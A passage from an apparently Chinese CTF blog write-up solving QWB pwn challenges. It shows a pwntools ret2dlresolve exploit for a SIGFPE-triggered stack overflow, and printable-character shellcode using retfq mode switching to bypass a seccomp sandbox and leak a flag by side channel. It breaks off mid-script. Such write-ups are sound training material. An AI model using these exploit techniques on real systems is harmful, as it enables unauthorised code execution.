eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  result = open(<span class="string">&quot;real_flag.txt&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  unk_804C080 = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>来看到<code>sub_8049269</code>函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">__sighandler_t</span> <span class="title">sub_8049269</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__sighandler_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> (*v1)(<span class="keyword">int</span>); <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">2</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">&quot;give me the soul:&quot;</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">  v3 = <span class="string">&quot;give me the egg:&quot;</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)sub_8049236);<span class="comment">// set handler，SIGFPE表示一个算数运算异常</span></span><br><span class="line">    v2[<span class="number">1</span>] = v2[<span class="number">0</span>] / (<span class="keyword">int</span>)v1;<span class="comment">// sub_8049236为漏洞函数</span></span><br><span class="line">    <span class="keyword">return</span> signal(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>学习一下<code>signal</code>函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sighandler_t signal(int signum, sighandler_t handler);</span><br></pre></td></tr></table></figure><ul><li><p>参数<code>signum</code>指明了所要处理的信号类型，它可以取除了SIGKILL和SIGSTOP外的任何一种信号。</p><ul><li>题目中SIGFPE即常量8，为数学相关的异常，如被0除，浮点溢出，等等。</li></ul></li><li><p>看到<code>sub_8049236</code>漏洞函数，这里就是简单的栈溢出了：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8049236</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>思路：</p><ul><li>由于存在<code>strcpy(dest, src);</code>该函数存在1位的溢出，会在拷贝的最后一位后加上<code>\x00</code>，且刚好看到读入的fd指针就在<code>dest</code>全局变量的后面。那么我们可以通过这一位的溢出，将fd指针修改为<code>\x00</code>，那么<code>read</code>函数也就变成了读入输入的字符，那么我们就可以控制<code>src</code>了。</li><li>触发算数运算异常才能运行后门函数，但是<code>if (v1)</code>限制了<code>v1</code>不能为0，那么我们就来构造溢出，我们输入比<code>-2147483648</code>更小的数，由于<code>scanf</code>函数的特性，最终都是识别成<code>0x80000000</code>。输入<code>v1</code>为<code>-1</code>，$-2147483648\div-1=2147483648$，但是<code>2147483648</code>超出了符号int数的大小范围，会导致算数运算异常。</li><li><code>sub_8049236</code>函数内是简单的堆溢出，由于本题中没有输出，所以使用dl_runtime_resolve攻击。</li></ul></li><li><p>形成脚本（ret2dlresolve的思路大致理清楚了，后面再学）：</p><ul><li>注意<code>read</code>函数取消输入不仅可以通过换行字符，也可以通过时间停滞。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>) <span class="comment"># raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;hello_boy\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(-<span class="number">0x80000000</span>))</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol = <span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">info(rop.dump())</span><br><span class="line"></span><br><span class="line">sh.sendline(fit(&#123;<span class="number">0x4C</span>: rop.chain(), <span class="number">0x100</span>: dlresolve.payload&#125;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="强网先锋-shellcode"><a href="#强网先锋-shellcode" class="headerlink" title="[强网先锋]shellcode"></a>[强网先锋]shellcode</h3><ul><li><p>参考链接：<a href="https://www.cnblogs.com/countfatcode/p/11756258.html">https://www.cnblogs.com/countfatcode/p/11756258.html</a><br><a href="https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</a><br><a href="https://lingze.xyz/pages/07df2e/">https://lingze.xyz/pages/07df2e/</a></p></li><li><p>查看沙盒：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ seccomp-tools dump ./shellcode</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><ul><li>IDA反编译程序，查看主函数，主程序是入读shellcode并执行：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="keyword">unsigned</span> __int64)arg3, v2);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v5 = sys_read(<span class="number">0</span>, v4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4[(<span class="keyword">int</span>)v5 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[(<span class="keyword">int</span>)v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6 = v5 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">31</span> || v4[i] == <span class="number">127</span> )<span class="comment">// 限制读入的字符为可见字符串</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))v4)();<span class="comment">// 调用shellcode</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  v8 = sys_exit_group(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>retfq</code>指令的栈布局为：</p><ul><li><code>ret</code>（位于sp）：接下来要执行的地址。</li><li><code>set cs</code>（位于sp+4/8）：切换到64位系统下，参数值为0x33；切换到32位系统下，参数值为0x23。</li><li>需要的注意的是，在由64位变为32位后，rsp的值会变成非法值，故需先修复rsp的值在执行相应的代码（即<code>mov esp, 0x40404550</code>）。</li></ul></li></ul><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><ul><li>编写一个测试程序如下，并使用<code>gcc main.c -z execstack -o main</code>命令编译，编译为32位需加上<code>-m32</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用objdump打印出intel架构下的<code>main</code>函数，发现直接调用了链接库函数，这种方法行不通。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ objdump -M intel -d a.out | grep &#x27;&lt;main&gt;&#x27; -A 10</span><br><span class="line">0000000000400430 &lt;main&gt;:</span><br><span class="line">  400430:48 83 ec 08          sub    rsp,0x8</span><br><span class="line">  400434:31 d2                xor    edx,edx</span><br><span class="line">  400436:31 f6                xor    esi,esi</span><br><span class="line">  400438:bf d4 05 40 00       mov    edi,0x4005d4</span><br><span class="line">  40043d:e8 ce ff ff ff       call   400410 &lt;execve@plt&gt;</span><br><span class="line">  400442:31 c0                xor    eax,eax</span><br><span class="line">  400444:48 83 c4 08          add    rsp,0x8</span><br><span class="line">  400448:c3                   ret    </span><br><span class="line">  400449:0f 1f 80 00 00 00 00 nop    DWORD PTR [rax+0x0]</span><br></pre></td></tr></table></figure><ul><li>gdb反汇编execve函数的代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble execve</span><br><span class="line">Dump of assembler code for function execve:</span><br><span class="line">   0x00007ffff78937f0 &lt;+0&gt;:mov    eax,0x3b</span><br><span class="line">   0x00007ffff78937f5 &lt;+5&gt;:syscall </span><br><span class="line">   0x00007ffff78937f7 &lt;+7&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x00007ffff78937fd &lt;+13&gt;:jae    0x7ffff7893800 &lt;execve+16&gt;</span><br><span class="line">   0x00007ffff78937ff &lt;+15&gt;:ret</span><br></pre></td></tr></table></figure><ul><li>仿照上面写出代码（将字符串<code>/bin/sh\x00</code>压栈之后，又把栈地址赋值给rdi）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, 0</span><br><span class="line">mov rsi, 0</span><br><span class="line">mov rdi, 0x68732f6e69622f </span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov eax, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><ul><li>优化选项（长度为0xc）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov al, 59</span><br><span class="line">push rbx</span><br><span class="line">push rbx</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br><span class="line">mov rdi, 0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="继续题解"><a href="#继续题解" class="headerlink" title="继续题解"></a>继续题解</h4><ul><li>查看32位和64位的系统调用号：<a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">系统调用号</th><th style="text-align:center">x86</th><th style="text-align:center">x64</th></tr></thead><tbody><tr><td style="text-align:center">5</td><td style="text-align:center">open</td><td style="text-align:center">fstat</td></tr><tr><td style="text-align:center">37</td><td style="text-align:center">kill</td><td style="text-align:center">alarm</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">write</td><td style="text-align:center">stat</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">restart_syscall</td><td style="text-align:center">read</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">link</td><td style="text-align:center">mmap</td></tr><tr><td style="text-align:center">231</td><td style="text-align:center">fgetxattr</td><td style="text-align:center">exit_group</td></tr></tbody></table></div><ul><li><code>mmap</code>调用 的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">code_mmap = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/*mov rdi, 0x40404040*/</span></span><br><span class="line">   push <span class="number">0x40404040</span></span><br><span class="line">   pop rdi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rsi, 0x7e*/</span></span><br><span class="line">   push <span class="number">0x7e</span></span><br><span class="line">   pop rsi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rdx, 0x7*/</span></span><br><span class="line">   push <span class="number">0x37</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line">   push rax</span><br><span class="line">   pop rdx</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov r8, 0*/</span></span><br><span class="line">   push <span class="number">0x30</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line">   push rax</span><br><span class="line">   pop r8</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov r9, 0*/</span></span><br><span class="line">   push rax</span><br><span class="line">   pop r9</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*syscall*/</span></span><br><span class="line">   push <span class="number">0x5e</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x2c</span>], cl</span><br><span class="line">   push <span class="number">0x5c</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x2d</span>], cl</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rax, 0x9*/</span></span><br><span class="line">   push <span class="number">0x39</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>read</code>调用的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">code_read = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/*mov rsi, 0x40404040*/</span></span><br><span class="line">   push <span class="number">0x40404040</span></span><br><span class="line">   pop rsi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rdi, 0*/</span></span><br><span class="line">   push <span class="number">0x30</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line">   push rax</span><br><span class="line">   pop rdi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rdx, 0x7e*/</span></span><br><span class="line">   push <span class="number">0x7e</span></span><br><span class="line">   pop rdx</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rax, 0*/</span></span><br><span class="line">   push <span class="number">0x30</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/*syscall*/</span></span><br><span class="line">   push <span class="number">0x5e</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x4f</span>], cl</span><br><span class="line">   push <span class="number">0x5c</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x50</span>], cl</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>retfq</code>指令的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">code_retfq = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/* 算出0x48 */</span></span><br><span class="line">   push <span class="number">0x39</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx + <span class="number">0x71</span>], cl</span><br><span class="line">   push <span class="number">0x20</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx + <span class="number">0x71</span>], cl</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 利用无借位减法算出0xcb</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   push <span class="number">0x47</span></span><br><span class="line">   pop rcx</span><br><span class="line">   sub byte ptr [rbx + <span class="number">0x72</span>], cl</span><br><span class="line">   sub byte ptr [rbx + <span class="number">0x72</span>], cl</span><br><span class="line">   push rdi</span><br><span class="line">   push rdi</span><br><span class="line">   push <span class="number">0x23</span></span><br><span class="line">   push <span class="number">0x40404040</span></span><br><span class="line">   pop rax</span><br><span class="line">   push rax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>open</code>调用的shellcode（32位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">code_open = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/* open函数 */</span></span><br><span class="line">   mov esp, <span class="number">0x40404550</span></span><br><span class="line">   push <span class="number">0x67616c66</span><span class="comment">/* flag */</span></span><br><span class="line">   mov ebx, esp</span><br><span class="line">   <span class="keyword">xor</span> ecx, ecx</span><br><span class="line">   <span class="keyword">xor</span> edx, edx</span><br><span class="line">   mov eax, <span class="number">0x5</span></span><br><span class="line">   <span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line">   mov ecx, eax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>retfq</code>从32位转回64位的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code_retfq_1 = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line">   <span class="comment">/* retfq */</span></span><br><span class="line">   push <span class="number">0x33</span></span><br><span class="line">   push <span class="number">0x40404062</span> <span class="comment">/* 具体数字有待修改 */</span></span><br><span class="line">   retfq</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>read</code>的shellcode（64位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code_read = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   mov rdi,rcx</span><br><span class="line">   mov rsi,rsp</span><br><span class="line">   mov rdx,<span class="number">0x70</span></span><br><span class="line">   <span class="keyword">xor</span> rax,rax</span><br><span class="line">   syscall</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>append的shelllcode（64位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code_append = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   push rcx</span><br><span class="line">   pop rcx</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>append的shelllcode（32位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code_append_x86 = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   push ebx</span><br><span class="line">   pop ebx</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>侧信道攻击：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">   shellcode_flag += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   shellcode_flag += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br></pre></td></tr></table></figure><ul><li>最后形成脚本（注意自己调用<code>read</code>的时候是不需要使用可见字符的shellcode的）：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span 